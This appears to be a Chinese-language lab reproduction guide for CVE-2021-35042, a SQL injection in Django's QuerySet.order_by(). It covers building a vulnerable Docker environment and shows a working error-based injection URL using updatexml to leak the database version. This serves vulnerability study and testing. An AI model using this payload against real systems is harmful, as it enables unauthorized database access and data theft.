# Django QuerySet.order_by()函数SQL注入漏洞（CVE-2021-35042）

Django是一个高级的Python Web框架，支持快速开发和简洁实用的设计。

Django在2021年7月1日发布了安全更新，修复了在QuerySet.order_by()函数中存在的SQL注入漏洞。该漏洞影响Django 3.2.5、3.1.13和2.2.24之前的版本。

当用户可以控制传递给order_by()函数的输入时，可以在预期的列位置进行SQL注入攻击。

参考链接：

- <https://www.djangoproject.com/weblog/2021/jul/01/security-releases/>

## 环境搭建

执行如下命令编译并启动一个存在漏洞的Django 3.2.4服务器：

```
docker compose build
docker compose up -d
```

环境启动后，访问`http://your-ip:8000`即可看到Django默认首页。

## 漏洞复现

首先访问`http://your-ip:8000/vuln/`，并添加参数`order=-id`以查看按ID降序排序的数据：

![](1.png)

要利用SQL注入漏洞，使用以下payload修改`order`参数，其中`vuln_collection`是模型名称：

```
http://your-ip:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23
```

SQL错误信息将会显示，通过基于错误的SQL注入泄露数据库信息：

![](2.png)
